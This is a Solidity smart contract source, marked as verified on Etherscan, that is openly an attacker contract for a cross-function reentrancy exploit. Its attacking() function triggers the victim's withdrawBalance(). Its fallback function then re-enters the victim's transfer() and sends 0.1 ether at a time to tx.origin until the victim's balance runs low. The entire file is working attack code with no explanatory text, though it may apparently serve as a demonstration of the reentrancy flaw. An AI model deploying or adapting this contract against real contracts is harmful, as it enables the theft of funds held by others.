/**
 *Submitted for verification at Etherscan.io on 2021-05-03
*/

pragma solidity 0.4.25;

interface attacker_Interface{
	function withdrawBalance() external returns(bool);
	function transfer(address to, uint amount) external returns(bool);
	function userbalances(address _user) external view returns(uint);
	
}
contract Attacker_Cross_Function{
	
	address public victimContractAddress;
	
	function () external payable{
		if(victimContractAddress.balance > 0.1 ether) attacker_Interface(victimContractAddress).transfer(tx.origin,0.1 ether);
	}
	function attacking() public returns(bool){
		attacker_Interface(victimContractAddress).withdrawBalance();
		return true;
	}
	function UpdateVictimContractAddress(address _victim) public returns(bool){
		victimContractAddress = _victim;
		return true;
	}
	function getbalance() public view returns(uint){
		return address(this).balance;
	}
}